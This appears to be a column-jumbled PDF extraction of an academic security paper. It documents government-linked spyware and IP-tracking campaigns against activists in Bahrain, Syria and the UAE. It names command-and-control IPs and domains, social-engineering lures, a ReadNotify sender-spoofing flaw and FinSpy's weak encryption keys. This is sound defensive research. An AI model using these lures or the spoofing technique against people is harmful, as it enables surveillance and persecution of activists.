of anyone who clicks . Analytics for the link indicate that it had
tecting individuals against indiscriminate , large - scale attacks
been clicked once from inside Bahrain . On 6/25/13 , Ali was
such as those used by cybercriminals . Recently , the prob-
sentenced to one year in prison .
lem of protecting institutions against targeted attacks conducted
Ali ’s case is an example of the larger phenomenon we in-
by nation - states ( so - called “ Advanced Persistent Threats ” ) has
vestigate : attacks against activists , dissidents , trade unionists ,
likewise elicited significant research interest . Where these two
human rights campaigners , journalists , and members of NGOs
problem domains intersect , however — targeted cyber attacks by
( henceforth “ targets ” ) in the Middle East . The attacks we have
nation - states against individuals — has received virtually no sig-
documented usually involve the use of malicious links or e - mail
nificant , methodical research attention to date . This new prob-
attachments , designed to obtain information from a device . On
lem space poses challenges that are both technically complex
the one hand , we have observed attacks using a wide range of
and of significant real - world importance .
off - the - shelf spyware , as well as publicly available third - party
In this work we undertake to characterize the emergent prob-       services , like iplogger.org . On the other hand , some at-
lem space of nation - state Internet attacks against individuals        tacks use so - called “ lawful intercept ” trojans and related equip-
engaged in pro - democracy or opposition movements . While
we lack the data to do so in a fully comprehensive fashion ,              1 Dates    in the paper are given MM / DD / YY .
USENIX Association 	                                                                          23rd USENIX Security Symposium    511
ment , purportedly sold exclusively to governments by compa-                do so in a sufficiently well - grounded , meaningful manner first
nies like Gamma International and Hacking Team . The lat-                   requires developing an understanding of the targets’ knowledge
ter advertises that governments need its technology to “ look               of security issues , their posture regarding how they currently
through their target ’s eyes ” rather than rely solely on “ passive           protect themselves , and the resources ( including potentially ed-
monitoring ” [ 1 ] . Overall , the attacks we document are rarely               ucation ) that they can draw upon . To this end , we are now con-
technically novel . In fact , we suspect that the majority of at-            ducting ( with IRB approval ) in - depth interviews with potential
tacks could be substantially limited via well - known security               targets along with systematic examination of their Internet de-
practices , settings , and software updates . Yet , the attacks are            vices in order to develop such an understanding .
noteworthy for their careful social engineering , their links to
governments , and their real - world impact .
We obtained the majority of our artifacts by encouraging in-            2     Related Work
dividuals who might be targeted by governments to provide us
with suspicious files and unsolicited links , especially from un-           In the past decades , a rich body of academic work has grown to
familiar senders . While this process has provided a rich set of            document and understand government Internet censorship , in-
artifacts to analyze , it does not permit us to claim our dataset is        cluding nationwide censorship campaigns like the Great Fire-
representative .                                                            wall of China [ 9 , 10 , 11 ] . Research on governmental Internet
Our analysis links these attacks with a common class of ac-             surveillance and activities like law - enforcement interception is
tor : an attacker whose behavior , choice of target , or use of in-           a comparatively smaller area [ 12 ] . Some academic work looks
formation obtained in the attack , aligns with the interests of a           at government use of devices to enable censorship , such as key-
government . In some cases , such as Ali ’s , the attackers appear             word blacklists for Chinese chat clients [ 13 ] , or the Green Dam
to be governments themselves ; in other cases , they appear in-              censorware that was to be deployed on all new computers sold
stead to be pro - government actors , ranging from patriotic , not             in China [ 14 ] . We are aware of only limited previous work
necessarily skilled volunteers to cyber mercenaries . The phe-              looking at advanced threat actors targeting activists with hack-
nomenon has been identified before , such as in Libya , when                 ing , though this work has not always been able to establish ev-
the fall of Gaddafi ’s regime revealed direct government ties to            idence of government connections [ 15 ] .
hacking during the 2011 Civil War [ 2 ] .                                        Platforms used by potential targets , such as GMail [ 16 ] ,
We make the following contributions :                                    Twitter [ 17 ] , and Facebook [ 18 ] increasingly make transport-
• We analyze the technology associated with targeted at-                layer encryption the default , obscuring communications from
tacks ( e.g. , malicious links , spyware ) , and trace it back             most network surveillance . This use of encryption , along with
to its programmers and manufacturers . While the attacks               the global nature of many social movements , and the role of
are not novel — and indeed often involve technology used                diaspora groups , likely makes hacking increasingly attractive ,
by the cybercrime underground — they are significant be-                especially to states who are unable to request or compel content
cause they have a real - world impact and visibility , and               from these platforms . Indeed , the increasing use of encryption
are connected to governments . In addition , we often find              and the global nature of targets have both been cited by pur-
amateurish mistakes in either the attacker ’s technology or            veyors of “ lawful intercept ” trojans in their marketing materi-
operations , indicating that energy spent countering these             als [ 1 , 19 ] . In one notable case in 2009 , UAE telecom firm Eti-
threats can realize significant benefits . We do not , how-             salat distributed a system update to its then 145,000 BlackBerry
ever , conclude that all nation - state attacks or attackers             subscribers that contained spyware to read encrypted Black-
are incompetent , and we suspect that some attacks have                Berry e - mail from the device . The spyware was discovered
evaded our detection .                                                 when the update drastically slowed users’ phones [ 20 ] . In con-
trast to country - scale distribution , our work looks at this kind of
• When possible , we empirically characterize the attacks
pro - government and government - linked surveillance through
and technology we have observed . We map out global
highly targeted attacks .
use of two commercial hacking tools by governments by
searching through Internet scan data using fingerprints for              The term APT ( Advanced Persistent Threat ) refers to a
command - and - control ( C&C ) servers derived from our                    sophisticated cyber - attacker who persistently attempts to tar-
spyware analysis .                                                     get an individual or group [ 21 ] . Work outside the academic
community tracking government cyberattacks typically falls
• We develop strong evidence tying attacks to govern-                   under this umbrella . There has been significant work on
ment sponsors and corporate suppliers , countering de-                 APT outside the academic community , especially among se-
nials , sometimes energetic and sometimes indirect , of                 curity professionals , threat intelligence companies , and human
such involvement [ 3 , 4 , 5 , 6 ] , in contrast to denials [ 7 ]             rights groups . Much of this work has focused on suspected
or claims of a corporate “ oversight ” board [ 8 ] . Our scan-             government - on - government or government - on - corporation cy-
ning suggests use of “ lawful intercept ” trojans by 11 ad-             ber attacks [ 22 , 23 ] . Meanwhile , a small but growing body
ditional countries considered governed by “ authoritarian              of this research deals with attacks carried out by governments
regimes . ” We believe that activists and journalists in such           against opposition and activist groups operating within , as well
countries may experience harassment or consequences to                as outside their borders . One of the most notable cases is
life or liberty from government surveillance .                         GhostNet , a large - scale cyber espionage campaign against the
Finally , we do not explore potential defenses appropriate for           Tibetan independence movement [ 24 , 25 ] . Other work avoids
protecting the target population in this work . We believe that to          drawing conclusions about the attackers [ 26 ] .
2
512    23rd USENIX Security Symposium 	                                                                                   USENIX Association
Country    Date Range           Range of Targets                                Number and Type of Samples                               Distinct Malware C&C ’s
Bahrain    4/9/12—              ≥ 12 activists , dissidents , trade unionists ,    8 FinSpy samples , 7 IP spy links received via private    4 distinct IP addresses
7/31/13              human rights campaigners , and journalists       message , > 200 IP spy links observed publicly
Syria      2011 to present      10–20 individuals with technical back-          40–50 : predominantly BlackShades , DarkComet ,             160 distinct IP addresses
grounds who receive suspect files from their    Xtreme RAT , njRAT , ShadowTech RAT .
contacts
UAE        7/23/12—             7 activists , human rights campaigners , and      31 distinct malware samples spanning 7 types ; 5 dis-     12 distinct IP addresses
7/31/13              journalists                                     tinct exploits
Table 1 : Range of data for the study .
Country    Possible Impacts                   Probable Impacts
Bahrain    1 . 3 individuals arrested , sen-    1 . Activist serving 1 yr in
tenced to 1–12 mo in prison        prison
2 . Union leader questioned by      2 . Police raid on house
police ; fired
Syria      1 . Sensitive opposition com-       1 . Opposition members dis-
munications exposed to gov-        credited by publishing embar-
ernment                            rassing materials
2 . Exfiltrated material used to    2 . Exfiltrated materials used
identify and detain activists      during interrogation by secu-
rity services
UAE        Contacts targeted via mal-         Password stolen ,         e - mail
ware                               downloaded
Table 2 : Negative outcomes plausibly or quite likely aris-
ing from attacks analyzed .                                                                          Figure 1 : E - mail containing FinSpy .
4.1       Bahrain
3       Data Overview and Implications
We have analyzed two attack campaigns in the context of
Our study is based on extensive analysis of malicious files and                       Bahrain , where the government has been pursuing a crackdown
suspect communications relevant to the activities of targeted                         against an Arab - Spring inspired uprising since 2/14/2011 .
groups in Bahrain , Syria , and the UAE , as documented in Ta-                              The first involved malicious e - mails containing FinSpy , a
ble 1 . A number of the attacks had significant real - world impli-                      “ lawful intercept ” trojan sold exclusively to governments . The
cations , per Table 2 . In many cases , we keep our descriptions                         second involved specially crafted IP spy links and e - mails de-
somewhat imprecise to avoid potential leakage of target identi-                       signed to reveal the IP addresses of operators of pseudonymous
ties .                                                                                 accounts . Some individuals who apparently clicked on these
We began our work when contacted by individuals con-                               links were later arrested , including Ali ( cf . § 1 ) , whose click
cerned that a government might have targeted them for cyber-                          appears to have been used against him in court . While both
attacks . As we became more acquainted with the targeted com-                          campaigns point back to the government , we have not as yet
munities , in some cases we contacted targeted groups directly ;                        identified overlap between the campaigns ; targets of FinSpy
in others , we reached out to individuals with connections to tar-                     appeared to reside mainly outside Bahrain , whereas the IP spy
geted groups , who allowed us to examine their communications                          links targeted those mainly inside the country . We examine
with the groups . For Bahrain and Syria , the work encompassed                          each campaign in turn .
10,000s of e - mails and instant messages . For the UAE , the vol-
ume is several thousand communications .
FinSpy Campaign . Beginning in April 2012 , the authors
received 5 suspicious e - mails from US and UK - based activists
4       Case Studies : Three Countries                                                  and journalists working on Bahrain .         We found that some
of the attachments contained a PE ( .exe ) file designed to
This following sections outline recent targeted hacking cam-                          appear as an image .          Their filenames contained a Uni-
paigns in Bahrain , Syria and the UAE . These cases have a com-                         code right - to - left override ( RLO ) character , causing Windows
mon theme : attacks against targets’ computers and devices with                        to render a filename such as gpj.1bajaR.exe instead as
malicious files and links . In some cases the attackers employed                       exe . Rajab1.jpg .
expensive and “ government exclusive ” malware , while in other                             The other .rar files contained a Word document with an
cases , attackers used cheap and readily available RATs . Across                        embedded ASCII - encoded PE file containing a custom macro
these cases we find that clever social engineering often plays                        set to automatically run upon document startup . Under default
a central role , which is strong evidence of a well - informed ad-                       security settings , Office disables all unsigned macros , so that
versary . We also , however , frequently find technical and op-                          a user who opens the document will only see an informational
erational errors by the attackers that enable us to link attacks                      message that the macro has been disabled . Thus , this attack was
to governments . In general , the attacks we find are not well-                         apparently designed with the belief or hope that targets would
detected by anti - virus programs .                                                      have reduced security settings .
3
USENIX Association 	                                                                                             23rd USENIX Security Symposium    513
Identification as FinSpy : By running the sample using                   ated with another government [ 4 ] . However , a proxy would
Windows Virtual PC , we found the following string in mem-                  show gaps in a global IPID as it forwarded traffic ; our frequent
ory : y:\lsvn_branches\finspyv4.01\finspyv2\.                               observation of strictly consecutive IPIDs thus contradicts this
This string suggests FinSpy , a product of Gamma Inter-                     statement .
national [ 27 ] . The executables used virtualized obfusca-                      Exploitation of captured data : Since we suspected the spy-
tion [ 28 ] , which appeared to be custom - designed . We de-                    ware operator would likely seek to exploit captured credentials ,
vised a fingerprint for the obfuscater and located a structurally          particularly those associated with Bahraini activist organiza-
similar executable by searching a large malware database .                  tions , we worked with Bahrain Watch , an activist organization
This executable contained a similar string , except it identi-              inside Bahrain . Bahrain Watch established a fake login page
fied itself as FinSpy v3.00 , and attempted to connect to                   on their website and provided us with a username and pass-
tiger.gamma-international.de , a domain registered                          word . From a clean VM , we logged in using these credentials ,
to Gamma International GmbH.                                               saving the password in Mozilla Firefox . We then infected the
Analysis of capabilities : We found that the spyware has                 VM with FinSpy and allowed it to connect to the Bahrain C&C
a modular design , and can download additional modules from                 server . Bahrain Watch ’s website logs revealed a subsequent
a command & control ( C&C ) server , including password cap-                  hit from 89.148.0.41—made however to the site ’s home-
ture ( from over 20 applications ) and recording of screenshots ,             page , rather than its login page — coming shortly after we had
Skype chat , file transfers , and input from the computer ’s micro-           infected the VM . Decrypting packet captures of the spyware ’s
phone and webcam .                                                          activity , we found that our VM sent the password to the server
To exfiltrate data back to the C&C server , a module encrypts            exactly one minute earlier :
and writes it to disk in a special folder . The spyware period-
ically probes this folder for files that match a certain naming            INDEX , URL , USERNAME , PASSWORD , USERNAME FIELD ,
convention , then sends them to the C&C server . It then over-               PASSWORD FIELD , FILE , HTTP 1 ,
writes the files , renames them several times , and deletes them ,            http://bahrainwatch.org,bhwatch1,watchba7rain ,
username , password , signons.sqlite , ,
in an apparent effort to frustrate forensic analysis .                      Very Strong,3.5/4.x
Analysis of encryption : Because the malware employed
myriad known anti - debugging and anti - analysis techniques , it                  The URL provided to the server did not include the path
thwarted our attempts to attach debuggers . Since it did not in-            to the login page , which was inaccessible from the home-
clude anti - VM code , we ran it in TEMU , an x86 emulator de-                 page . This omission reflects the fact that the Firefox password
signed for malware analysis [ 29 ] . TEMU captures instruction-               database stores only domain names , not full login page URLs ,
level execution traces and provides support for taint - tracking .            for each password . Repeating the experiment again yielded a
We found that FinSpy encrypts data using a custom imple-                hit from the same IP address within a minute . We inspected
mentation of AES-256-CBC . The 32 byte AES key and 16 byte                  Bahrain Watch ’s logs , which showed no subsequent ( or previ-
IV are generated by repeatedly reading the low - order-4-bytes of            ous ) activity from that address , nor any instances of the same
the Windows clock . The key and IV are encrypted using an em-               User Agent string .
bedded RSA-2048 public key , and stored in the same file as the
data . The private key presumably resides on the C&C server .
The weak AES keys make decryption of the data straightfor-                 IP spy Campaign . In an IP spy attack , the attacker aims to
ward . We wrote a program that generally can find these keys in             discover the IP address of a victim who is typically the opera-
under an hour , exploiting the fact that many of the system clock           tor of a pseudonymous social media or e - mail account . The at-
readings occur within the same clock - update quantum .                       tacker sends the pseudonymous account a link to a webpage or
In addition , FinSpy ’s AES code fails to encrypt the last block          an e - mail containing an embedded remote image , using one of
of data if less than the AES block size of 128 bits , leaving trail-        many freely - available services.2 When the victim clicks on the
ing plaintext . Finally , FinSpy ’s wire protocol for C&C commu-              link or opens the e - mail , their IP address is revealed to the at-
nication uses the same type of encryption , and thus is subject             tacker.3 The attacker then discovers the victim ’s identity from
to the same brute force attack on AES keys . While we suspect               their ISP . In one case we identified legal documents that pro-
FinSpy ’s cryptographic deficiencies reflect bugs , it is also con-          vided a circumstantial link between such a spy link and a sub-
ceivable that the cryptography was deliberately weakened to                sequent arrest .
facilitate one government monitoring the surveillance of oth-                 Figure 2 illustrates the larger ecosystem of these attacks . The
ers .                                                                       attackers appear to represent a single entity , as the activity all
C&C server :             The samples communicated with                    connects back to accounts that sent links shortened using a par-
77.69.140.194 , which belongs to a subscriber of                            ticular user account al9mood4 on the bit.ly URL shortening
Batelco , Bahrain ’s main ISP . Analyzing network traffic                     service .
between our infected VM and the C&C server revealed that                      Recall Ali Faisal Al - Shufa ( discussed in Section 1 ) , who
the server used a global IPID , which allowed us to infer server            was accused of sending insulting tweets from an account
activity by its progression .                                                  2 e.g. ,
iplogger.org , ip-spy.com , ReadNotify.com .
In response to our preliminary work an executive at Gamma                  3 Several webmail providers and e - mail clients take limited steps to
told the press that Bahrain ’s FinSpy server was merely a proxy             automatically block loading this content , but e - mails spoofed to come
and the real server could have been anywhere , as part of a claim           from a trusted sender sometimes bypass these defenses .
that the Bahrain FinSpy deployment could have been associ-                    4 A Romanization of the Arabic word for “ steadfastness . ”
4
514    23rd USENIX Security Symposium 	                                                                                      USENIX Association
feb14truth.webs.com
Bit.ly user
iplogger.org                                                                                  Al9mood
Twitter ID
485527587                              Bahrain Gov't
Jehad Abdulla                                                                                           Twitter ID
Salman Darwish
( Gov't critic )                                                                                        987487705
Arrested
Account begins
sending IP spy links
Red Sky
( Translator )    Arrested
fatoomah85@gmail.com
Twitter ID
485500245
Al Kawarah News Clicked
Ali Al - Shufa
( Village media )   link                                                                  ReadNotify.com
Arrested
ip-spy.com
M         Clicked
House raid
( Village media )    link                                                 Maryam                 Sayed Yousif
Yokogawa Union                              Sami Abdulaziz Yokogawa
( Trade union )                              Fired from job Middle East
Legend
Actor    Spyware      C&C     Domain name      Packer     Target    Infection Targeted         Exploit       E - Mail      Consequence Attacker Bait Document
Figure 2 : The ecosystem of Bahrain “ IP spy ” attacks .
@alkawarahnews ( Al Kawarah News in Figure 2 ) . An op-                                             revolved around Tweets that referred to Bahrain ’s King as a
erator of the account forwarded us a suspicious private message                                  “ cursed one . ” Red Sky had earlier targeted other users with IP
sent to the Al Kawarah News Facebook account from Red Sky .                                       spy links shortened using the al9mood bit.ly account .
Red Sky was purportedly arrested on 10/17/12 , was convicted
The attack on Jehad Abdulla is noteworthy , as the ac-
of insulting the King on his Twitter account @RedSky446 ,
count ’s activity aligned with communities typically critical of
and was sentenced to four months prison.5 When released , he
Bahrain ’s opposition . However , the account also directly crit-
found that the passwords for his Twitter , Facebook , and e - mail
icized the King on occasion , in one case referring to him as
accounts had been changed , and did not know how to recover
“ weak ” and “ stingy . ” An account linked to al9mood sent Je-
his accounts .
had Abdulla an IP spy link on 10/2/12 in a public message . On
The message that Red Sky ’s account sent to Al Kawarah
10/16/12 , Salman Darwish was arrested for insulting the King
News included a link shortened using Google ’s goo.gl ser-
using the Jehad Abdulla account . He was sentenced to one
vice . We used the goo.gl API to access analytics for the link ,
month in prison , partly on the basis of his confession . Salman ’s
finding that it unshortened to iplogger.org/25SX and was
father claims that police denied Salman food , drink , and medi-
created on 12/8/12 . The link had received only one click , which
cal care .
came from Bahrain with the referrer www.facebook.com .
Ali ’s case files contained a request from the Public Prose-                                      Another account linked to al9mood targeted @YLUBH , the
cution for information on an IP address that it had linked to Al                                 Twitter account of Yokogawa Union , a trade union at the
Kawarah News about 22 hours after the link was created . Court                                    Bahraini branch of a Japanese company . @YLUBH received at
documents indicate that ISP data linked the IP address to Ali ,                                   least three IP spy links in late 2012 , sent via public Twitter mes-
and on this basis he was sentenced to one year in prison .                                        sages . Yokogawa fired the leader of the trade union , Sami Ab-
Red Sky also targeted M in Figure 2 . M recalled click-                                        dulaziz Hassan , on 3/23/13 [ 30 ] . It later emerged that Sami was
ing on a link from Red Sky while using an Internet connec-                                       indeed the operator of the @YLUBH account , and that the police
tion from one of the houses in M ’s village . The house was                                        had called him in for questioning in relation to its tweets [ 31 ] .
raided by police on 3/12/13 , who were looking for the sub-
Use of embedded remote images : We identified several
scriber of the house ’s internet connection . Police questioning
targets who received spoofed e - mails containing embedded
5 According to information we received from two Twitter users , one                            remote images . Figure 2 shows two such cases , Maryam
of whom claimed to have met Red Sky in prison ; another to be a col-                              and Sayed Yousif . The attacker sent the e - mails using
league .                                                                                          ReadNotify.com , which records the user ’s IP address upon
5
USENIX Association 	                                                                                                                   23rd USENIX Security Symposium    515
their mail client downloading the remote image.6                             sophisticated than FinSpy and RCS , they share the same ba-
While ReadNotify.com forbids spoofing in their TOS ,                       sic functionality , including screen capture , keylogging , remote
the service has a vulnerability known to the attackers ( and                  monitoring of webcams and microphones , remote shell , and file
which we confirmed ) that allows spoofing the From address                    exfiltration .
by directly setting the parameters on a submission form on their                 In the most common attack sequence we observed , illus-
website We have not found evidence suggesting this vulnerabil-               trated with three examples in Figure 3 , the attacker seeds mal-
ity is publicly known , but it appears clear that the attacker ex-            ware via private chat messages , posts in opposition - controlled
ploited it , as the web form adds a X - Mai1er : RNwebmail                       social media groups , or e - mail . These techniques often limit
header not added when sending through ReadNotify.com ’s                       the world - visibility of malicious files and links , slowing their
other supported methods . The header appeared in each e - mail                  detection by common AV products . Typically , targets receive
the targets forwarded to us .                                                 either ( 1 ) a PE in a .zip or .rar , ( 2 ) a file download link , or
When spoofing using this method , the original sender ad-                  ( 3 ) a link that will trigger a drive - by download . The messages
dress still appears in X - Sender and other headers . Accord-                   usually include text , often in Arabic , that attempts to persuade
ing to these , the e - mails received by the targets all came from              the target to execute the file or click the link .
fatoomah85@gmail.com . A link sent in one of these e-                             The first attacks in Figure 3 date to 2012 , and use bait files
mails was connected to the al9mood bit.ly account .                           with a DarkComet RAT payload . These attacks share the same
In monitoring accounts connected to al9mood , we counted                   C&C , 216.6.0.28 , a Syrian IP address belonging to the Syr-
more than 200 IP spy links in Twitter messages and public                    ian Telecommunications Establishment , and publicly reported
Facebook posts . Attackers often used ( 1 ) accounts of promi-                  as a C&C of Syrian malware since February 2012 [ 45 ] . The
nent or trusted but jailed individuals like “ Red Sky , ” ( 2 ) fake              first bait file presents to the victim as a PDF containing infor-
personas ( e.g. , attractive women or fake job seekers when tar-               mation about a planned uprising in Aleppo . In fact the file is a
geting a labor union ) , or ( 3 ) impersonations of legitimate ac-               Windows Screensaver ( .scr ) that masquerades as a PDF using
counts . In one particularly clever tactic , attackers exploited               Unicode RLO , rendering a name such as “ .fdp.scr ” dis-
Twitter ’s default font , for example substituting a lowercase “ l ”             play to the victim as “ .rcs.pdf . ” The second bait file is
with an uppercase “ I ” or switching vowels ( e.g. from “ a ” to                  a dummy program containing DarkComet while masquerading
an “ e ” ) to create at - a - glance identical usernames . In addition ,              as a Skype call encryption program , playing to opposition para-
malicious accounts tended to quickly delete IP spy tweets sent               noia about government backdoors in common software . The
via ( public ) mentions , and frequently change profile names .                  third attack in Figure 3 , observed in October 2013 , entices tar-
gets with e - mails purporting to contain or link to videos about
the current conflict , infecting victims with Xtreme RAT , and
4.2      Syria                                                                using the C&C tn1.linkpc.net .
The use of RATs against the opposition has been a well-                          For seeding , the attackers typically use compromised ac-
documented feature of the Syrian Civil War since the first re-               counts ( including those of arrested individuals ) or fake iden-
ports were published in early 2012 [ 36 , 39 , 40 , 32 , 34 ] . The                 tities masquerading as pro - opposition . Our illustration shows
phenomenon is widespread , and in our experience , most mem-                   in abstract terms the use of Victim A ’s account to seed mal-
bers of the opposition know that some hacking is taking place .               ware ( “ Aleppo Plan ” ) via ( say ) Skype messages to Victim(s )
As summarized in Table 3 , the attacks often include fake or ma-              Bn .      In the cases of Opp . Member C and NGO Worker
liciously packaged security tools ; intriguing , or ideological , or            D ( here , actual victims , not abstract ) , targeting was by e - mail
movement - relevant content ( e.g. lists of wanted persons ) . The                from domains apparently belonging to opposition groups , in-
seeding techniques and bait files suggest a good understanding               dicating a potential compromise . One domain remains active ,
of the opposition ’s needs , fears and behavior , coupled with ba-              hosting a website of the Salafist Al - Nusra front [ 46 ] , while the
sic familiarity with off - the - shelf RATs . In some cases attacks               other appears dormant . Opp . Member C received a malicious
occur in a context that points to a more direct connection to                file as an e - mail attachment , while NGO Worker D was sent a
one of the belligerents : the Syrian opposition has regularly ob-             shortened link ( url[.]no / Uu5 ) to a download from a directory
served that detainees’ accounts begin seeding malware shortly                of Mrconstrucciones[.]net,7 a site that may have been com-
after their arrest by government forces [ 41 ] .                                promised . Both attacks resulted in an Xtreme RAT infection .
Researchers and security professionals have already profiled                  Interestingly , in the case of the fake Skype encryption
many of these RATs , including DarkComet [ 42 , 43 ] , Black-                     the deception extended to a YouTube video from “ IT Se-
shades Remote Controller [ 38 ] , Xtreme RAT [ 44 ] , njRAT [ 26 ] ,                  curity Lab ” [ 47 ] demonstrating the program ’s purported ca-
and ShadowTech [ 36 ] . Some are available for purchase by any-                 pabilities , as well as a website promoting the tool , skype-
one , in contrast to “ government only ” FinSpy and RCS . For ex-                encryption.sytes.net . The attackers also constructed a ba-
ample , Xtreme RAT retails for e350 , while a version of Black-                sic , faux GUI for their “ Encryption ” program ( see Figure 4 ) .
shades lists for e40 . Others , like DarkComet , are free . We                   The fake GUI has a number of non - functional buttons like “ En-
have also observed cracked versions of these RATs on Arabic-                 crypt ” and “ DeCrypt , ” which generate fake prompts . While dis-
language hacker forums , making them available with little ef-                tracted by this meaningless interaction , the victim ’s machine is
fort and no payment trail . While the RATs are cheaper and less               infected with DarkComet 3.3 [ 32 , 33 ] .
Anecdotally , campaign volume appears to track significant
6 YahooMail and the iPhone mail client automatically load these re-
mote images , especially in e - mails spoofed from trusted senders .                7 Obfuscated    to avoid accidental clicks on active malware URLs .
6
516    23rd USENIX Security Symposium 	                                                                                        USENIX Association
Type                      Features                                                                      Examples ( RATs )
Security tools            Executable files presented as a “ tool ” often accompanied by justifica-        “ Skype Encryption ” ( DC ) [ 32 , 33 ] , “ Facebook Security ” ( cus-
tions or statements of its value in the targeted seeding , for example on      tom ) [ 34 ] , Anti - hacker ( DC ) [ 35 ] , Fake Freegate VPN ( ST ) [ 36 ]
a social media site , at the download location , or in videos
Ideologically    or        A document or PE as download or attachment with accompanying en-              “ Names of individuals wanted by the Regime , ” ( DC ) “ Aleppo
movement - relevant         couragement to open or act on the material , often masquerading as             [ uprising ] Plan ” ( DC ) [ 37 ] , important video ( BS ) [ 38 ] , “ Hama
files                     legitimate PDF documents or inadvertently leaked regime programs .             Rebels Council ” document ( DC ) [ 39 ] , “ wanted persons ”
Frequent use of RLO to disguise true extension ( such as .exe or               database frontend ( custom ) , movement relevant video ( njRAT ) ,
.scr )                                                                         file about the Free Syrian Army ( Xtreme RAT )
Miscellaneous tools       Tools pretending to offer functionality relevant to the opposition , such      hack facebook pro v6.9 ( DC ) [ 40 ]
as a fake tool claiming to “ mass report ” regime pages on Facebook
Table 3 : Campaigns and RATs employed in Syrian surveillance . BS = Blackshades , DC = DarkComet , ST = Shad-
owTech .
“ Skype
SY Malware       tn1.linkpc.net    skype - encription     Encryption ”     Xtreme Rat        Mrconstrucciones.net       Url.no
Actors                             .sytes.net
fsa@freesyria.com mohamed@jalnosra.com
216.6.0.28                                   fsa.zip
Dark Comet
SY Gov't                               Account seeds
“ Aleppo Plan ”
E - Mail                 E - Mail
Victim A                   Credentials
Arrested
gained
“ Aleppo Plan ”
Victim(s ) Bn     Clicks                                               Opp . Member C          NGO Worker D
file         Account seeds
“ Aleppo Plan ”
Figure 3 : A sample from the ecosystem of Syrian malware campaigns .
events in the ongoing conflict . For example , campaigns dwin-
dled and then rebounded within hours after Syria ’s 2012 Inter-
net shutdown [ 48 ] . Similarly , activity observed by the authors
also dwindled prior to expectation of US - led military action
against Syrian government targets in September 2013 . Once
this option appeared to be off the table , the volume of new
samples and campaigns we observed again increased , includ-
ing the recent targeting of NGO workers per Figure 3 . We are
aware of only a negligible number of cases of the opposition
using similar RATs against Syrian Government supporters , al-
though evidence exists of other kinds of electronic attacks by
third parties .
Real world consequences . The logistics and activities of
Syria ’s numerous opposition groups are intentionally concealed
from public view to protect both their efficacy , and the lives of
people participating in them . Nevertheless , Syrian opposition
members are generally familiar with stories off digital compro-                          Figure 4 : The fake Skype program distracts the victim
mises of high - profile figures , including those entrusted with the                        with the promise of encrypted communications while in-
most sensitive roles , as well as rank - and - file members . Com-                             fecting their machine with DarkComet .
promise of operational security poses a documented threat to
life both for victims of electronic compromise , and to family
members and associates .
The Syrian conflict is ongoing , making it difficult to assem-
7
USENIX Association 	                                                                                                23rd USENIX Security Symposium    517
ble comprehensive evidence of linkages between government                       UAE Gov't          HackingTeam             3-Stage
Exploit Kit
actors and malware campaigns . Moreover , many individuals                                                                                  owner.no-ip.biz
whose identities have been compromised are in prison or oth-
erwise disappeared , and thus unable to relate the evidence pre-                             CVE-2010 - 3333
sented to them during interrogation . Still , strong circumstantial
evidence links the use of RATs , phishing , and government ac-
“ wikileaks ”          Xtreme RAT
tivity , which we briefly summarize here : ( 1 ) many Syrians have                              RCS                  “ veryimportant ”
recounted to journalists and the authors how interrogators con-
fronted them with material from their computers . For example :
The policeman told me , “ Do you remember when
you were talking to your friend and you told him
you had something wrong [ sic ] and paid a lot of                                                     Author
money ? At that time we were taking information                               ar-24.com                                 Communicated
via E - Mail
from your laptop . ” [ 41 ]
( 2 ) Syrian activists have supplied cases to international journal-
ists [ 41 ] , where arrests are quickly followed by the social me-                   Ahmed
Laptop
infected
dia accounts of detained individuals seeding malware to contact                                                  E - Mail account
lists ( Figure 3 ) . ( 3 ) Finally , despite the notoriety of the attack                                               compromised
campaigns , including mention of C&C IPs in international me-
dia [ 45 ] , the Syrian government has made no public statements
about these campaigns nor acted to shut down the servers .                 Figure 5 : Part of the ecosystem of UAE surveillance at-
Beyond the ongoing challenges of attribution , these malware           tacks .
campaigns have a tangible impact on the Syrian opposition , and
generally align with the interests of the Syrian government ’s             from ar-24.com , which in turn downloaded spyware from
propaganda operations . The case of Abdul Razzaq Tlass , a                  ar-24.com . We denote this combination as the 3-Stage Ex-
leader in the Free Syrian Army , is illustrative of the potential          ploit Kit in Figure 5 .
uses of such campaigns . In 2012 a string of videos emerged                   The C&C server also ran on ar-24.com . When we ob-
showing Tlass sexting and engaged in lewd activity in front of            tained the sample in July 2012 , ar-24.com resolved to an
a webcam [ 49 ] . While he denied the videos , the harm to his rep-           IP address on Linode , a hosting provider . Three months later , it
utation was substantial and he was eventually replaced [ 50 ] .              resolved to a UAE address belonging to the Royal Group [ 52 ] ,
an organization linked to the UAE government ; it is chaired by
Sheikh Tahnoon bin Zayed Al - Nayhan , a member of the UAE
4.3     UAE
ruling family and a son of the founder of the UAE .
While the UAE has experienced no recent uprising or politi-                  Identification as RCS : We identified strings in memory
cal unrest , it has nevertheless cracked down on its opposition ,           that matched those in a Symantec analysis [ 53 ] of RCS ( also
concurrent with the Arab Spring .                                          known as DaVinci or Crisis ) , a product of the Italian com-
The first attacks we observed in the UAE involved a                    pany Hacking Team [ 54 ] . We also located a structurally sim-
government - grade “ lawful interception ” trojan known as Re-                ilar Word document via VirusTotal . The document used the
mote Control System ( RCS ) , sold by the Italian company Hack-              same exploit and attempted to download a second stage from
ing Team . The associated C&C server indicated direct UAE                  rcs-demo.hackingteam.it , which was unavailable at
government involvement . Over time , we stopped receiving                   the time of testing .
RCS samples from UAE targets , and instead observed a shift                   Analysis of capabilities : RCS has a suite of functionality
to the use of off - the - shelf RATs , and possible involvement of             largely similar to FinSpy . One difference was in the vectors
cyber - mercenary groups . However , poor attacker operational                used to install the spyware . We located additional samples ( see
security allowed us to link most observed attacks together .               § 5 ) , some of which were embedded in a .jar file that installs
an OS - appropriate version of RCS ( Windows or OSX ) , option-
RCS . UAE activist Ahmed Mansoor ( per Figure 5 ) , impris-                   ally using an exploit . If embedded as an applet , and no exploit
oned from April to November 2011 after signing an online pro-             is present , Java displays a security warning and asks the user
democracy petition [ 51 ] , received an e - mail purportedly from              whether they authorize the installation . We also saw instances
“ Arabic Wikileaks ” in July 2012 . He opened the associated at-             of the 3-Stage Exploit Kit where the first stage contained a
tachment , “ veryimportant.doc , ” and saw what he described as               Flash exploit ; in some cases , we could obtain all stages and
“ scrambled letters ” . He forwarded us the e - mail for investiga-            confirm that these installed RCS . Some samples were packed
tion .                                                                     with the MPress packer [ 55 ] , and some Windows samples were
The attachment exploited CVE-2010 - 3333 , an RTF pars-                   obfuscated to look like the PuTTY SSH client .
ing vulnerability in Microsoft Office . The document did not                  Another difference is in persistence . For example , the RCS
contain any bait content , and part of the malformed RTF                   sample sent to Ahmed adds a Run registry key , whereas the
